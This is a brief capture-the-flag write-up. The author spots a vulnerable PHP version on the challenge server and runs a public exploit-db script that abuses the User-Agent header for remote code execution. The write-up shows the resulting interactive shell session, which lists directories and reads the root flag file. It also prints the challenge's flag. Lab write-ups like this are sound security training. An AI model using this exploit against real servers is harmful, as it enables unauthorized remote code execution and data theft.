## challenge description
![[Screenshot_20230725_010726.png]]

### lets explore 

##### we have only one single page nothing in robots.txt ethier 
![[Screenshot_20230725_010925.png]]

##### lets try the repeater  , the first thing my eye saw was the PHP version 
![[Screenshot_20230725_011132.png]]

##### i searched for this version and it was vulnerable to user-agent RCE  

##### i used a script in exploit db [script](https://www.exploit-db.com/exploits/49933)

```
python3 49933.py    
Enter the full host url:  
http://139.144.184.115:8989/  
  
Interactive shell is opened on http://139.144.184.115:8989/    
Can't acces tty; job crontol turned off.  
$ ls  
index.php  
  
$ ls /  
bin  
boot  
dev  
etc  
home  
lib  
lib64  
media  
mnt  
opt  
proc  
root  
run  
sbin  
srv  
sys  
tmp  
usr  
var  
  
$ ls /root  
flag.txt  
  
$ cat /root/flag.txt  
BDSEC{php_15_7h3_b357_pr06r4mm1n6_l4n6u463}
```

### Easy one